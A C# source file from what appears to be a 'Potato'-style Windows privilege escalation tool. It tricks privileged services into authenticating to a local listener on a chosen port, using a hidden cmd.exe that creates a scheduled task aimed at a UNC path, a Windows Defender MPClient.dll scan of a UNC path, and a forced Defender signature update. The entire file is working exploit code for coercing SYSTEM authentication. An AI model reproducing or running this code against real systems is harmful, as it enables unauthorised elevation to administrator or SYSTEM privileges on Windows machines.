using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Potato
{

    class ScheduleTask
    {

        public void schtask(int port)
        {
            Console.WriteLine("Attempting to schedule a task...");
            String now = DateTime.Now.AddMinutes(1).ToString("HH:mm");
            System.Diagnostics.Process process3 = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
            startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo3.FileName = "cmd.exe";
            startInfo3.Arguments = "/C schtasks.exe /Create /TN omg /TR  \\\\127.0.0.1@" + port + "\\test /SC ONCE /ST " + now + " /F";

            Console.WriteLine(startInfo3.Arguments);
            process3.StartInfo = startInfo3;
            process3.Start();
            process3.WaitForExit();

        }
    }

    class UpdateLauncher
    {
        // MSFT_MpScan
        private const int MPCONTROL_ABORT = 0;
        private static IntPtr MpHandle;

        // Need a check, if exe is 32bit on 64bit OS, we need to use the x86 prog files path

        [DllImport("kernel32.dll")]
        private static extern void SetDllDirectory(string lpFileName);

        [DllImport("C:\\Program Files\\Windows Defender\\MPClient.dll")]
        private static extern int MpManagerOpen(uint dwReserved, out IntPtr MpHandle);

        [DllImport("C:\\Program Files\\Windows Defender\\MPClient.dll")]
        private static extern int MpHandleClose(IntPtr hMpHandle);

        [DllImport("C:\\Program Files\\Windows Defender\\MPClient.dll")]
        private static extern int MpScanControl(IntPtr hScanHandle, int ScanControl);

        [DllImport("C:\\Program Files\\Windows Defender\\MPClient.dll")]
        private static extern int MpUpdateStart(IntPtr hMpHandle, uint dwUpdateOptions, IntPtr pCallBack, out IntPtr pUpdateHandle);

        [DllImport("C:\\Program Files\\Windows Defender\\MPClient.dll")]
        private static extern int MpScanStart(IntPtr mgr, uint dwScanType, uint dwOptions, IntPtr ScanDetails, IntPtr CallBack, out IntPtr ScanHandle);


        [StructLayout(LayoutKind.Sequential)]
        public struct SCAN_FILE
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string file_type;
            [MarshalAs(UnmanagedType.LPWStr)]
            public string file_name;
            public uint umk; // 0
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SCAN_FILE_LIST
        {
            public uint count;
            public IntPtr files;
        }

        public void scan_file(int port)
        {
            // get handle
            MpHandle = new IntPtr();
            MpManagerOpen(0, out MpHandle);

            Random rnd = new Random();
            // Scan structure
            SCAN_FILE scn = new SCAN_FILE();
            scn.file_type = "file";
            scn.file_name = "//127.0.0.1@" +port+ "//lolwut" + Convert.ToString(rnd.Next(1, 1000000));
            scn.umk = 0;

            // scan list structure
            SCAN_FILE_LIST list = new SCAN_FILE_LIST();
            list.count = 1;
            int sz = Marshal.SizeOf(scn.GetType());
            IntPtr ptr = Marshal.AllocHGlobal(sz);
            Marshal.StructureToPtr((SCAN_FILE)scn, ptr, false);
            list.files = ptr; // pointer to Scan Structure

            // Convert scan list to pointer
            int sz2 = Marshal.SizeOf(list.GetType());
            IntPtr ptr2 = Marshal.AllocHGlobal(sz2);
            Marshal.StructureToPtr((SCAN_FILE_LIST)list, ptr2, false);

            // invoke call
            IntPtr scan_handle;
            MpScanStart(MpHandle, 3, 0x4001, ptr2, IntPtr.Zero, out scan_handle);

            // we have to wait, else it will close before we get a auth attempt
            Thread.Sleep(10000);

            try
            {
                MpHandleClose(scan_handle);
                MpHandleClose(MpHandle);

                MpHandleClose(ptr);
                MpHandleClose(ptr2);
            }
            catch (Exception e)
            { 
                Console.WriteLine("Error... most likely we didnt load the .dll properly...");
                Console.WriteLine(e);
            }

        }

        public void launchUpdateCheck()
        {
            if (File.Exists("C:\\Program Files\\Windows Defender\\MpCmdRun.exe"))
            {
                Console.WriteLine("Checking for windows defender updates...");
                System.Diagnostics.Process process3 = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo startInfo3 = new System.Diagnostics.ProcessStartInfo();
                startInfo3.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                startInfo3.FileName = "cmd.exe";
                startInfo3.Arguments = "/C \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate";
                process3.StartInfo = startInfo3;
                process3.Start();
                process3.WaitForExit();
            }
            else
            {
                Console.WriteLine("Sorry but we can't find MpCmdRun.exe");
            }
        }
    }
}